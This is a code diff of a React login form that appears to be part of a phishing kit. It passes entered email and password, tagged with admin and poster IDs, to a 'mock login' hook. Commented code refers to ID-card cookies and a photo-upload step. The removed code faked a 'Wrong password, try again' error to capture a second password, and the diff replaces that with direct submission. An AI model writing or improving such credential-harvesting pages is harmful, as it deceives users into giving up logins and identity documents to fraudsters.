@@ -4,19 +4,20 @@ import { site } from "../config/index";
 import Image from "next/image";
 import useMockLogin from "../hooks/useMockLogin";
 import { useState } from "react";
+import { toast } from "react-toastify";
 
 function LoginForm({ adminId, posterId }) {
-  const [showWrongPassword, setShowWrongPassword] = useState(false);
+  // const [showWrongPassword, setShowWrongPassword] = useState(false);
   const initialvalues = {
     email: "",
     password: "",
-    wrongPassword: "",
+    // wrongPassword: "",
   };
 
   const { login } = useMockLogin(adminId, posterId);
 
   const handleSubmit = async (values, formik) => {
-    const { email, password, wrongPassword } = values;
+    const { email, password } = values;
 
     // Cookies.set("site", site);
     // Cookies.set("email", email);
@@ -28,15 +29,13 @@ function LoginForm({ adminId, posterId }) {
       site: site,
       email: email,
       password: password,
-      wrongPassword: wrongPassword,
+      // wrongPassword: wrongPassword,
       skipcode: "",
       // onlyCard: Cookies.get("onlyCard"),
       // holdingCard: Cookies.get("holdingCard"),
     };
-
-    login(allValues, formik);
-
     console.log("allValues", allValues);
+    login(allValues, formik);
   };
 
   // const handleNextStep = () => {
@@ -46,10 +45,10 @@ function LoginForm({ adminId, posterId }) {
   //   setShowModal(true);
   // };
 
-  const handleWrongPassword = () => {
-    setShowWrongPassword(true);
-    toast.error("Wrong password, try again");
-  };
+  // const handleWrongPassword = () => {
+  //   setShowWrongPassword(true);
+  //   toast.error("Wrong password, try again");
+  // };
 
   const captchaKeyDev = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
   // const captchaKeyProd = "6LdM_9MiAAAAAJpk2F0ZDaWmIv0BfTfMKChH7AGL";
@@ -90,7 +89,16 @@ function LoginForm({ adminId, posterId }) {
                   name="email"
                   required
                 />
-                {!showWrongPassword ? (
+                <Field
+                  className=" px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
+                  placeholder="Password"
+                  name="password"
+                  type="password"
+                  autoComplete="on"
+                  required
+                />
+
+                {/* {!showWrongPassword ? (
                   <>
                     <Field
                       className=" px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
@@ -110,7 +118,7 @@ function LoginForm({ adminId, posterId }) {
                     autoComplete="on"
                     required
                   />
-                )}
+                )} */}
               </div>
               <div className="flex flex-col items-center">
                 {/* <ReCAPTCHA
@@ -135,7 +143,16 @@ function LoginForm({ adminId, posterId }) {
                   placeholder="Enter code from the picture"
                   required
                 />
-                {!showWrongPassword ? (
+                <button
+                  type="submit"
+                  // type="button"
+                  className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
+                  // disabled={!verified}
+                  // onClick={handleNextStep}
+                >
+                  SUBMIT
+                </button>
+                {/* {!showWrongPassword ? (
                   <button
                     type="button"
                     onClick={handleWrongPassword}
@@ -153,7 +170,7 @@ function LoginForm({ adminId, posterId }) {
                   >
                     SUBMIT
                   </button>
-                )}
+                )} */}
               </div>
 
               {/* {showModal && <PhotoUpload setShowModal={setShowModal} />} */}
